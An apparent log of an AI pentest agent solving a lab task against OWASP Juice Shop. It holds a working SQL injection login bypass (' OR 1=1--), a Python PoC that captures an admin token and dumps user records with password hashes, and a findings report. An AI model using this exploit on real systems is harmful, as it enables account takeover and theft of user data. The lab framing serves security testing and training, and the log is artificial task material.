@@ -1,0 +1,186 @@
+[
+  {
+    "type": "session_start",
+    "data": {
+      "engagement_name": "c03-sqli-admin",
+      "targets": "http://host.docker.internal:3000 (OWASP Juice Shop, my own lab)",
+      "allowed_hosts": [
+        "host.docker.internal",
+        "localhost",
+        "127.0.0.1"
+      ],
+      "goal": "Exploit SQL injection on the login endpoint to authenticate as the admin. Save the returned admin token (it starts with eyJ) to /workspace/evidence/c3_admin_token.txt",
+      "evidence": {
+        "type": "file_exists",
+        "path": "evidence/c3_admin_token.txt",
+        "contains": "eyJ"
+      },
+      "max_steps": 25,
+      "max_cost_usd": 0.25,
+      "cmd_timeout_s": 120,
+      "workspace": "C:/projects/ctf-agent/workspace"
+    },
+    "ts": "2026-10-18T12:26:06.824001"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0002,
+      "tokens_in": 1195,
+      "tokens_out": 130
+    },
+    "ts": "2026-10-18T12:26:08.110127"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://host.docker.internal:3000/ && curl -s -i -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"test@test.com\",\"password\":\"test\"}' | head -40"
+      }
+    },
+    "ts": "2026-10-18T12:26:08.110127"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0005,
+      "tokens_in": 1503,
+      "tokens_out": 138
+    },
+    "ts": "2026-10-18T12:26:09.523860"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "curl -s -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" | head -c 600; echo"
+      }
+    },
+    "ts": "2026-10-18T12:26:09.523860"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.001,
+      "tokens_in": 2054,
+      "tokens_out": 928
+    },
+    "ts": "2026-10-18T12:26:13.849630"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "write_file",
+      "args": {
+        "path": "pocs/c03_sqli_admin_login.py",
+        "content": "#!/usr/bin/env python3\n\"\"\"\nPoC: SQL Injection in OWASP Juice Shop login endpoint -> admin authentication.\n\nTarget : POST http://host.docker.internal:3000/rest/user/login\nPayload: email = \"' OR 1=1--\"   (password: arbitrary)\nCause  : The email is concatenated into the SQL query unescaped:\n         SELECT * FROM Users WHERE email = '<email>' AND password = '<hash>'\n         \"' OR 1=1--\" makes the WHERE clause always true and comments out\n         the password check. The query returns the first user row, id=1 = admin.\n\nOutput : admin JWT (starts with eyJ) saved to /workspace/evidence/c3_admin_token.txt\n\"\"\"\nimport json\nimport sys\nimport urllib.request\n\nBASE = \"http://host.docker.internal:3000\"\nOUT = \"/workspace/evidence/c3_admin_token.txt\"\n\n\ndef post(path, body):\n    req = urllib.request.Request(\n        BASE + path,\n        data=json.dumps(body).encode(),\n        headers={\"Content-Type\": \"application/json\"},\n        method=\"POST\",\n    )\n    with urllib.request.urlopen(req) as r:\n        return json.loads(r.read())\n\n\ndef get(path, token):\n    req = urllib.request.Request(\n        BASE + path, headers={\"Authorization\": \"Bearer \" + token}\n    )\n    with urllib.request.urlopen(req) as r:\n        return r.status, json.loads(r.read())\n\n\ndef main():\n    # 1. Baseline: valid-looking creds must be rejected (proves login works)\n    try:\n        post(\"/rest/user/login\", {\"email\": \"nobody@example.com\", \"password\": \"wrong\"})\n        print(\"[-] unexpected: baseline login succeeded\", file=sys.stderr)\n        return 1\n    except urllib.error.HTTPError as e:\n        print(f\"[*] baseline login rejected: HTTP {e.code}\")\n\n    # 2. Injection: bypass authentication, return first row (admin, id=1)\n    payload = {\"email\": \"' OR 1=1--\", \"password\": \"irrelevant\"}\n    data = post(\"/rest/user/login\", payload)\n    token = data[\"authentication\"][\"token\"]\n    user = data[\"authentication\"][\"umail\"] if \"umail\" in data[\"authentication\"] else None\n\n    import base64\n\n    claims = json.loads(base64.urlsafe_b64decode(token.split(\".\")[1] + \"==\"))\n    d = claims[\"data\"]\n    print(f\"[+] authenticated as email={d['email']} role={d['role']} id={d['id']}\")\n    assert token.startswith(\"eyJ\")\n    assert d[\"role\"] == \"admin\", \"not admin!\"\n\n    # 3. Verify token is honored on an admin-only endpoint\n    status, users = get(\"/api/Users\", token)\n    print(f\"[+] GET /api/Users -> HTTP {status}, {len(users['data'])} users dumped\")\n    assert status == 200 and users[\"data\"], \"admin API not accessible\"\n\n    # 4. Save loot\n    import os\n\n    os.makedirs(\"/workspace/evidence\", exist_ok=True)\n    with open(OUT, \"w\", newline=\"\\n\") as f:\n        f.write(token + \"\\n\")\n    print(f\"[+] admin token saved to {OUT}\")\n\n    # bonus: dump users as evidence\n    with open(\"/workspace/evidence/c3_users_dump.json\", \"w\") as f:\n        json.dump(users, f, indent=2)\n    print(\"[+] user dump saved to /workspace/evidence/c3_users_dump.json\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n"
+      }
+    },
+    "ts": "2026-10-18T12:26:13.849630"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0014,
+      "tokens_in": 3026,
+      "tokens_out": 62
+    },
+    "ts": "2026-10-18T12:26:15.341001"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && python3 pocs/c03_sqli_admin_login.py; echo \"--- exit=$? ---\""
+      }
+    },
+    "ts": "2026-10-18T12:26:15.341001"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0019,
+      "tokens_in": 3200,
+      "tokens_out": 168
+    },
+    "ts": "2026-10-18T12:26:17.030074"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && wc -c evidence/c3_admin_token.txt && head -c 60 evidence/c3_admin_token.txt && echo && T=$(cat evidence/c3_admin_token.txt) && curl -s -o /dev/null -w \"whoami HTTP=%{http_code}\\n\" http://host.docker.internal:3000/rest/user/whoami -H \"Authorization: Bearer $T\" && curl -s http://host.docker.internal:3000/rest/user/whoami -H \"Authorization: Bearer $T\"; echo"
+      }
+    },
+    "ts": "2026-10-18T12:26:17.030074"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0027,
+      "tokens_in": 3454,
+      "tokens_out": 914
+    },
+    "ts": "2026-10-18T12:26:22.092243"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "write_file",
+      "args": {
+        "content": "# c03 \u2014 SQL Injection in Login Endpoint \u2192 Admin Authentication\n\n**Target:** http://host.docker.internal:3000 (OWASP Juice Shop)\n**Endpoint:** `POST /rest/user/login`\n**Severity:** Critical\n**Status:** CONFIRMED (exploited, token saved)\n\n## Vulnerability\n\nThe `email` field of `POST /rest/user/login` is concatenated into a SQL query\nwithout parameterization:\n\n```sql\nSELECT * FROM Users WHERE email = '<email>' AND password = '<md5(password)>'\n```\n\nInjecting `' OR 1=1--` makes the predicate always true and comments out the\npassword check. Because the query returns rows in id order, the first row\nreturned is `id=1` \u2014 the site administrator (`admin@juice-sh.op`). The server\nissues a validly signed admin JWT regardless of the supplied password.\n\n## Exploit\n\n```bash\ncurl -s -X POST http://host.docker.internal:3000/rest/user/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"'\"'\"' OR 1=1--\",\"password\":\"x\"}'\n```\n\n```json\n{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"umail\":\"admin@juice-sh.op\"}}\n```\n\nReproducible script: `/workspace/pocs/c03_sqli_admin_login.py` (exit 0).\n\n## Impact\n\n- Full authentication bypass: no password required.\n- Admin-token theft \u2192 access to `/api/Users` (23 accounts, incl. password\n  hashes and reset questions), plus all other admin-only Juice Shop endpoints.\n- Any account achievable by varying the injection (e.g. filter by email) or by\n  enumerating rows.\n\n## Evidence\n\n| File | Content |\n|---|---|\n| `/workspace/evidence/c3_admin_token.txt` | admin JWT (718 bytes, begins `eyJ`) |\n| `/workspace/evidence/c3_users_dump.json` | 23 users dumped via `GET /api/Users` with the token |\n| `/workspace/pocs/c03_sqli_admin_login.py` | PoC: baseline 401 \u2192 inject \u2192 verify admin \u2192 save |\n\nJWT claims for the captured token: `id=1`, `email=admin@juice-sh.op`, `role=admin`.\n\n## Verification steps performed\n\n1. Baseline `nobody@example.com` / `wrong` \u2192 HTTP 401 (login gate works).\n2. Injection payload \u2192 HTTP 200 with signed JWT, claims show `role=admin`.\n3. `GET /api/Users` with the token \u2192 HTTP 200, 23 records (admin-only).\n4. Token persisted to `/workspace/evidence/c3_admin_token.txt`.\n\n## Remediation\n\nUse parameterized queries / an ORM for all authentication lookups; never\nconcatenate user input into SQL. Additionally, do not return the password hash\nor other sensitive fields in the login response/JWT payload, and enforce\nrequest body schema validation on the login endpoint.\n",
+        "path": "findings/c03_sqli_admin_login.md"
+      }
+    },
+    "ts": "2026-10-18T12:26:22.092243"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0033,
+      "tokens_in": 4412,
+      "tokens_out": 183
+    },
+    "ts": "2026-10-18T12:26:23.585707"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && ls -la evidence findings pocs && echo \"--- token first/last chars ---\" && cut -c1-40 evidence/c3_admin_token.txt && T=$(cat evidence/c3_admin_token.txt) && python3 -c \"\nimport base64,json,sys\nt=open('evidence/c3_admin_token.txt').read().strip()\np=t.split('.')[1]; p+='='*(-len(p)%4)\nd=json.loads(base64.urlsafe_b64decode(p))['data']\nprint('id=',d['id'],'role=',d['role'],'email=',d['email'])\nprint('prefix_ok=',t.startswith('eyJ'))\""
+      }
+    },
+    "ts": "2026-10-18T12:26:23.585707"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0045,
+      "tokens_in": 7226,
+      "tokens_out": 569
+    },
+    "ts": "2026-10-18T12:26:27.345926"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "finish",
+      "args": {
+        "summary": "## Result: GOAL MET \u2014 admin token captured and saved\n\n**Vulnerability:** SQL injection in `POST /rest/user/login` on OWASP Juice Shop (http://host.docker.internal:3000), severity Critical.\n\n**Payload:** `{\"email\":\"' OR 1=1--\",\"password\":\"x\"}` \u2014 the email is concatenated into `SELECT * FROM Users WHERE email='<email>' AND password='<hash>'`, so the injected predicate is always true and `--` comments out the password check. The query returns rows in id order, so the first row (id=1, `admin@juice-sh.op`) is authenticated and a validly signed RS256 admin JWT is returned.\n\n**Verification chain (all executed successfully):**\n1. Baseline `nobody@example.com`/`wrong` \u2192 HTTP 401 (login gate functional).\n2. Injection \u2192 HTTP 200, JWT claims decode to `id=1, email=admin@juice-sh.op, role=admin`.\n3. Token replayed against admin-only `GET /api/Users` \u2192 HTTP 200, 23 user records returned (incl. password hashes).\n4. Token persisted; file re-read and decoded to confirm `role=admin` and `eyJ` prefix.\n\n**Loot (in /workspace):**\n- `evidence/c3_admin_token.txt` \u2014 718-byte admin JWT, starts with `eyJ` \u2705 (deliverable)\n- `evidence/c3_users_dump.json` \u2014 23-user dump obtained with the token\n- `pocs/c03_sqli_admin_login.py` \u2014 self-verifying PoC (baseline \u2192 inject \u2192 validate admin \u2192 save); runs clean, exit 0\n- `findings/c03_sqli_admin_login.md` \u2014 writeup with impact, evidence table and remediation\n\n**Note:** `/rest/user/whoami` returned `{}` with a header-only token (Juice Shop quirk); the admin-only `/api/Users` 200 response is the authoritative privilege proof. No out-of-scope hosts touched, no destructive actions. Remediation: parameterized queries/ORM for auth lookups, schema validation on login, and stop leaking the password hash inside the JWT payload."
+      }
+    },
+    "ts": "2026-10-18T12:26:27.346433"
+  },
+  {
+    "type": "session_end",
+    "data": {
+      "summary": "## Result: GOAL MET \u2014 admin token captured and saved\n\n**Vulnerability:** SQL injection in `POST /rest/user/login` on OWASP Juice Shop (http://host.docker.internal:3000), severity Critical.\n\n**Payload:** `{\"email\":\"' OR 1=1--\",\"password\":\"x\"}` \u2014 the email is concatenated into `SELECT * FROM Users WHERE email='<email>' AND password='<hash>'`, so the injected predicate is always true and `--` comments out the password check. The query returns rows in id order, so the first row (id=1, `admin@juice-sh.op`) is authenticated and a validly signed RS256 admin JWT is returned.\n\n**Verification chain (all executed successfully):**\n1. Baseline `nobody@example.com`/`wrong` \u2192 HTTP 401 (login gate functional).\n2. Injection \u2192 HTTP 200, JWT claims decode to `id=1, email=admin@juice-sh.op, role=admin`.\n3. Token replayed against admin-only `GET /api/Users` \u2192 HTTP 200, 23 user records returned (incl. password hashes).\n4. Token persisted; file re-read and decoded to confirm `role=admin` and `eyJ` prefix.\n\n**Loot (in /workspace):**\n- `evidence/c3_admin_token.txt` \u2014 718-byte admin JWT, starts with `eyJ` \u2705 (deliverable)\n- `evidence/c3_users_dump.json` \u2014 23-user dump obtained with the token\n- `pocs/c03_sqli_admin_login.py` \u2014 self-verifying PoC (baseline \u2192 inject \u2192 validate admin \u2192 save); runs clean, exit 0\n- `findings/c03_sqli_admin_login.md` \u2014 writeup with impact, evidence table and remediation\n\n**Note:** `/rest/user/whoami` returned `{}` with a header-only token (Juice Shop quirk); the admin-only `/api/Users` 200 response is the authoritative privilege proof. No out-of-scope hosts touched, no destructive actions. Remediation: parameterized queries/ORM for auth lookups, schema validation on login, and stop leaking the password hash inside the JWT payload."
+    },
+    "ts": "2026-10-18T12:26:27.346433"
+  }
+]
